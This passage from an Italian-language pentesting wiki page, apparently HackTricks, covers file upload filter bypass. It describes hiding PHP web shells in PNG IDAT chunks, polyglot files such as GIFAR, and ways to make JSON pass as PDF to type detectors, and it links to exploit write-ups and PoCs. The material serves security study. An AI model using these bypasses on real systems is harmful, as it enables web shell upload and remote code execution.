Incorporare una PHP shell nel chunk IDAT di un file PNG può bypassare efficacemente alcune operazioni di image processing. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, poiché vengono comunemente usate per ridimensionare e risamplare le immagini, rispettivamente. La capacità della PHP shell incorporata di rimanere inalterata da queste operazioni è un vantaggio significativo per alcuni casi d'uso.

Un'esplorazione dettagliata di questa tecnica, inclusa la metodologia e le potenziali applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## File Polyglot

I file polyglot sono uno strumento peculiare in sicurezza informatica, agendo come camaleonti che possono esistere validamente in più formati di file contemporaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come archivio RAR. Tali file non sono limitati a questa coppia; combinazioni come GIF e JS o PPT e JS sono anch'esse possibili.

L'utilità principale dei file polyglot risiede nella loro capacità di eludere misure di sicurezza che controllano i file in base al tipo. La pratica comune in molte applicazioni consiste nel permettere solo determinati tipi di file in upload—come JPEG, GIF o DOC—per mitigare il rischio rappresentato da formati potenzialmente dannosi (es. JS, PHP o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più tipi di file, può bypassare queste restrizioni in modo furtivo.

Nonostante la loro adattabilità, i polyglot incontrano dei limiti. Per esempio, mentre un polyglot potrebbe contemporaneamente incarnare un file PHAR e un JPEG, il successo del suo upload potrebbe dipendere dalla politica sulle estensioni del sistema. Se la piattaforma è rigida sulle estensioni consentite, la sola dualità strutturale di un polyglot potrebbe non essere sufficiente per garantirne l'upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Caricare JSON validi come se fossero PDF

Come evitare le rilevazioni del tipo di file caricando un file JSON valido anche se non consentito, falsificando un file PDF (tecniche da **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono nei primi 1024 bytes è considerato valido (vedi esempio nel post)
- **`pdflib` library**: Aggiungere un formato PDF finto all'interno di un campo del JSON in modo che la library lo interpreti come PDF (vedi esempio nel post)
- **`file` binary**: Il binario `file` può leggere fino a 1048576 bytes da un file. Basta creare un JSON più grande di tale dimensione così non può parsare il contenuto come json e poi all'interno del JSON inserire la parte iniziale di un PDF reale e lo considererà un PDF

## Riferimenti

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
